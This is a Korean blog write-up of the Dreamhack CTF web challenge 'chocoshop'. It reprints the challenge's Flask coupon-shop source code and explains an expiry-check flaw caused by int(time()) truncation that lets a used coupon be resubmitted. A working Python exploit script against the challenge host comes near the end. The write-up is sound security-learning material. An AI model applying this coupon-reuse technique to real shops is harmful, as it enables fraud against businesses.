---
layout: single
title: "[Dreamhack] chocoshop write-up"
date: 2024-12-29 18:51 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## [Dreamhack] chocoshop

<br>

### 문제 설명

- 드림이는 빼빼로데이를 맞아 티오리제과에서 빼빼로 구매를 위한 쿠폰을 받았습니다.
- 하지만 우리의 목적은 FLAG! 그런데 이런, FLAG는 너무 비싸 살 수가 없네요...
- 쿠폰을 여러 번 발급받고 싶었는데 이것도 불가능해요. 내부자 말에 의하면 사용된 쿠폰을 검사하는 로직이 취약하다는데, 드림이를 도와 FLAG를 구매하세요!

<br>

### 풀이

문제 페이지에 접속해보니 세션을 발급하라는 버튼이 있어 누르면 아래와 같이 SHOP과 MYPAGE 버튼이 있고 위에는 userid 같은 값이랑 금액이 나온다.

<img src="/images/2024-12-29-chocoshop/{B38C0A43-182A-4F82-AAE2-39A2F692993F}.png" alt="{B38C0A43-182A-4F82-AAE2-39A2F692993F}" style="zoom: 50%;" />

<br>

#### 소스 코드

```python
from flask import Flask, request, jsonify, current_app, send_from_directory
import jwt
import redis
from datetime import timedelta
from time import time
from werkzeug.exceptions import default_exceptions, BadRequest, Unauthorized
from functools import wraps
from json import dumps, loads
from uuid import uuid4

r = redis.Redis()
app = Flask(__name__)

# SECRET CONSTANTS
# JWT_SECRET = 'JWT_KEY'
# FLAG = 'DH{FLAG_EXAMPLE}'
from secret import JWT_SECRET, FLAG

# PUBLIC CONSTANTS
COUPON_EXPIRATION_DELTA = 45
RATE_LIMIT_DELTA = 10
FLAG_PRICE = 2000
PEPERO_PRICE = 1500


def handle_errors(error):
    return jsonify({'status': 'error', 'message': str(error)}), error.code


for de in default_exceptions:
    app.register_error_handler(code_or_exception=de, f=handle_errors)


def get_session():
    def decorator(function):
        @wraps(function)
        def wrapper(*args, **kwargs):
            uuid = request.headers.get('Authorization', None)
            if uuid is None:
                raise BadRequest("Missing Authorization")

            data = r.get(f'SESSION:{uuid}')
            if data is None:
                raise Unauthorized("Unauthorized")

            kwargs['user'] = loads(data)
            return function(*args, **kwargs)
        return wrapper
    return decorator


@app.route('/flag/claim')
@get_session()
def flag_claim(user):
    if user['money'] < FLAG_PRICE:
        raise BadRequest('Not enough money')

    user['money'] -= FLAG_PRICE
    return jsonify({'status': 'success', 'message': FLAG})


@app.route('/pepero/claim')
@get_session()
def pepero_claim(user):
    if user['money'] < PEPERO_PRICE:
        raise BadRequest('Not enough money')

    user['money'] -= PEPERO_PRICE
    return jsonify({'status': 'success', 'message': 'lotteria~~~~!~!~!'})


@app.route('/coupon/submit')
@get_session()
def coupon_submit(user):
    coupon = request.headers.get('coupon', None)
    if coupon is None:
        raise BadRequest('Missing Coupon')

    try:
        coupon = jwt.decode(coupon, JWT_SECRET, algorithms='HS256')
    except:
        raise BadRequest('Invalid coupon')

    if coupon['expiration'] < int(time()):
        raise BadRequest('Coupon expired!')

    rate_limit_key = f'RATELIMIT:{user["uuid"]}'
    if r.setnx(rate_limit_key, 1):
        r.expire(rate_limit_key, timedelta(seconds=RATE_LIMIT_DELTA))
    else:
        raise BadRequest(f"Rate limit reached!, You can submit the coupon once every {RATE_LIMIT_DELTA} seconds.")


    used_coupon = f'COUPON:{coupon["uuid"]}'
    if r.setnx(used_coupon, 1):
        # success, we don't need to keep it after expiration time
        if user['uuid'] != coupon['user']:
            raise Unauthorized('You cannot submit others\' coupon!')

        r.expire(used_coupon, timedelta(seconds=coupon['expiration'] - int(time())))
        user['money'] += coupon['amount']
        r.setex(f'SESSION:{user["uuid"]}', timedelta(minutes=10), dumps(user))
        return jsonify({'status': 'success'})
    else:
        # double claim, fail
        raise BadRequest('Your coupon is alredy submitted!')


@app.route('/coupon/claim')
@get_session()
def coupon_claim(user):
    if user['coupon_claimed']:
        raise BadRequest('You already claimed the coupon!')

    coupon_uuid = uuid4().hex
    data = {'uuid': coupon_uuid, 'user': user['uuid'], 'amount': 1000, 'expiration': int(time()) + COUPON_EXPIRATION_DELTA}
    uuid = user['uuid']
    user['coupon_claimed'] = True
    coupon = jwt.encode(data, JWT_SECRET, algorithm='HS256').decode('utf-8')
    r.setex(f'SESSION:{uuid}', timedelta(minutes=10), dumps(user))
    return jsonify({'coupon': coupon})


@app.route('/session')
def make_session():
    uuid = uuid4().hex
    r.setex(f'SESSION:{uuid}', timedelta(minutes=10), dumps(
        {'uuid': uuid, 'coupon_claimed': False, 'money': 0}))
    return jsonify({'session': uuid})


@app.route('/me')
@get_session()
def me(user):
    return jsonify(user)


@app.route('/')
def index():
    return current_app.send_static_file('index.html')

@app.route('/images/<path:path>')
def images(path):
    return send_from_directory('images', path)

```

<br>

get_session 함수를 보면 uuid 변수에 HTTP 요청 헤더 `Authorization` 값을 가져오고, 값이 없으면 BadRequest 예외를 발생시키고 있다. 값이 있다면 Redis에서 저장된 세션키를 조회하고, 마찬가지로 없다면 Unauthorized 예외를 발생시킨다. Redis에서 세션키 조회가 확인되면 이를 json 형식으로 변환하여 kwargs에 users라는 이름으로 추가하고 있다. 

```python
def get_session():
    def decorator(function):
        @wraps(function)
        def wrapper(*args, **kwargs):
            uuid = request.headers.get('Authorization', None)
            if uuid is None:
                raise BadRequest("Missing Authorization")

            data = r.get(f'SESSION:{uuid}')
            if data is None:
                raise Unauthorized("Unauthorized")

            kwargs['user'] = loads(data)
            return function(*args, **kwargs)
        return wrapper
    return decorator
```

<br>

/flag/claim 경로의 소스 코드를 보면 money가 FLAG_PRICE 값보다 많으면 return 값으로 FLAG를 반환해준다. FLAG_PRICE 값은 2000이다.

```python
@app.route('/flag/claim')
@get_session()
def flag_claim(user):
    if user['money'] < FLAG_PRICE:
        raise BadRequest('Not enough money')

    user['money'] -= FLAG_PRICE
    return jsonify({'status': 'success', 'message': FLAG})

FLAG_PRICE = 2000
```

<br>

My Page 탭에서 쿠폰을 발급받고 Submit 버튼을 눌러보면 1000원이 들어와있고, Claim 버튼을 한 번 더 누르니 이미 전에 발급되었다고 alert창이 뜨는 걸 볼 수 있다.

<img src="/images/2024-12-29-chocoshop/{F94C04BE-C6B5-4B62-9AA1-23953D62599B}.png" alt="{F94C04BE-C6B5-4B62-9AA1-23953D62599B}" style="zoom:50%;" />

<img src="/images/2024-12-29-chocoshop/{E126A172-572C-4D8E-BDE0-645B96B29BCC}.png" alt="{E126A172-572C-4D8E-BDE0-645B96B29BCC}" style="zoom:50%;" />

<br>

아래와 같이 Claim 버튼을 누르면 쿠폰을 발급하고 submit 해서 success 되는 패킷을 볼 수 있다.

![{7E3CB9E5-9FAE-42DC-B80A-00643DA9E482}](/images/2024-12-29-chocoshop/{7E3CB9E5-9FAE-42DC-B80A-00643DA9E482}.png)

![{91B94D19-C208-45B7-A500-96F4B814CA9A}](/images/2024-12-29-chocoshop/{91B94D19-C208-45B7-A500-96F4B814CA9A}.png)

<br>

또한 처음 접속할 때 세션 버튼을 누르면 아래와 같이 session이라는 값을 주고, 요청할 때마다 `Authorization` 헤더를 검사하는 것을 볼 수 있다. 

![{E2A9C3B2-2938-45A9-9170-60E959FF6F4D}](/images/2024-12-29-chocoshop/{E2A9C3B2-2938-45A9-9170-60E959FF6F4D}.png)

![{62C0B2FF-D85B-43B9-994F-22C3BE913413}](/images/2024-12-29-chocoshop/{62C0B2FF-D85B-43B9-994F-22C3BE913413}.png)

<br>

여기서 문제 설명을 다시 읽어보면 사용된 쿠폰을 검사하는 로직이 취약하다고 되어 있다. 쿠폰이 발급되는 /coupon/claim 경로의 소스 코드를 보아 JWT 부분을 우회할 수 있는 부분을 살펴보면 JWT_SECRET 값으로 인코딩을 진행하고 이는 secret.py에 urandom.(32)로 되어있어 힘들 것 같다. 또한 한 가지 더 살펴볼 것은 `expiration`이라는 만료기간을 보면 `int(time())`으로 현재 시간에서 `COUPON_EXPIRATION_DELTA` 값인 45를 더하는 것으로 보아 만료기간이 45초라는 것을 알 수 있다.

```python
@app.route('/coupon/claim')
@get_session()
def coupon_claim(user):
    if user['coupon_claimed']:
        raise BadRequest('You already claimed the coupon!')

    coupon_uuid = uuid4().hex
    data = {'uuid': coupon_uuid, 'user': user['uuid'], 'amount': 1000, 'expiration': int(time()) + COUPON_EXPIRATION_DELTA}
    uuid = user['uuid']
    user['coupon_claimed'] = True
    coupon = jwt.encode(data, JWT_SECRET, algorithm='HS256').decode('utf-8')
    r.setex(f'SESSION:{uuid}', timedelta(minutes=10), dumps(user))
    return jsonify({'coupon': coupon})

```

<br>

submit 부분 소스 코드를 보면 중간 부분에 expiration값이 현재 시간보다 적으면 `Coupon expired!`라는 에러를 내보내고 있다. 여기서 취약한 점은 int와 time() 함수를 동시에 사용한 것인데 time() 함수는 현재 시간을 소수점까지 float 형태로 반환을 해주는데 int 형으로 이를 변환하면 45.999라는 값도 int로 인해서 45가 되니 45에서 46초까지의 시간에 쿠폰을 여러번 요청하면 쿠폰을 재발급할 수 있다는 것을 알 수 있다.

```python
@app.route('/coupon/submit')
@get_session()
def coupon_submit(user):
    coupon = request.headers.get('coupon', None)
    if coupon is None:
        raise BadRequest('Missing Coupon')

    try:
        coupon = jwt.decode(coupon, JWT_SECRET, algorithms='HS256')
    except:
        raise BadRequest('Invalid coupon')

    if coupon['expiration'] < int(time()):
        raise BadRequest('Coupon expired!')

    rate_limit_key = f'RATELIMIT:{user["uuid"]}'
    if r.setnx(rate_limit_key, 1):
        r.expire(rate_limit_key, timedelta(seconds=RATE_LIMIT_DELTA))
    else:
        raise BadRequest(f"Rate limit reached!, You can submit the coupon once every {RATE_LIMIT_DELTA} seconds.")


    used_coupon = f'COUPON:{coupon["uuid"]}'
    if r.setnx(used_coupon, 1):
        # success, we don't need to keep it after expiration time
        if user['uuid'] != coupon['user']:
            raise Unauthorized('You cannot submit others\' coupon!')

        r.expire(used_coupon, timedelta(seconds=coupon['expiration'] - int(time())))
        user['money'] += coupon['amount']
        r.setex(f'SESSION:{user["uuid"]}', timedelta(minutes=10), dumps(user))
        return jsonify({'status': 'success'})
    else:
        # double claim, fail
        raise BadRequest('Your coupon is alredy submitted!')
```

<br>

따라서 아래와 같이 익스플로잇 코드를 짤 수 있는데 세션 발급과 쿠폰 발급, 그리고 제출할 때 한 번 제출하고 만료 기간인 45초에서 46초 사이에 요청을 한 번 더 하는데 이건 인터넷 속도마다 다르니 time.sleep 인자값을 적절히 맞추고 하면 된다.

```python
import time
import requests

host = 'http://host1.dreamhack.games:22577'

# 세션 발급
sessionurl = f'{host}/session'
r = requests.get(sessionurl)
session_data = r.json()
authorization = session_data['session']
print(f"세션: {authorization}")

# 쿠폰 발급
claimurl = f'{host}/coupon/claim'
header = {
    "Authorization": authorization
}
r = requests.get(claimurl,headers=header)
coupon_data = r.json()
coupon = coupon_data['coupon']
print(f"쿠폰: {coupon}")

# 쿠폰 제출
submiturl = f'{host}/coupon/submit'
header = {
    "Authorization": authorization,
    "coupon": coupon
}
r = requests.get(submiturl, headers=header)
status_data = r.json()
status = status_data['status']
print(f"첫 번째 요청: {status}")

time.sleep(45)

for i in range(2, 5):
    r = requests.get(submiturl, headers=header)
    status_data = r.json()
    status = status_data['status']
    print(f"{i}번째 요청: {status}")

moneyurl = f'{host}/me'
header = {
    "Authorization": authorization
}
r = requests.get(moneyurl, headers=header)
money_data = r.json()
money = money_data['money']
print(f"money: {money}")\
```

![{A990EF69-71AF-4892-83C2-7FD7DBA200EE}](/images/2024-12-29-chocoshop/{A990EF69-71AF-4892-83C2-7FD7DBA200EE}.png)

<br>

이제 세션값을 문제 페이지에서 붙여넣어주고 flag를 사면 아래와 같이 flag가 나온다.

![{CA79F217-DA96-4D63-B7BB-7F30A0DA38A7}](/images/2024-12-29-chocoshop/{CA79F217-DA96-4D63-B7BB-7F30A0DA38A7}.png)
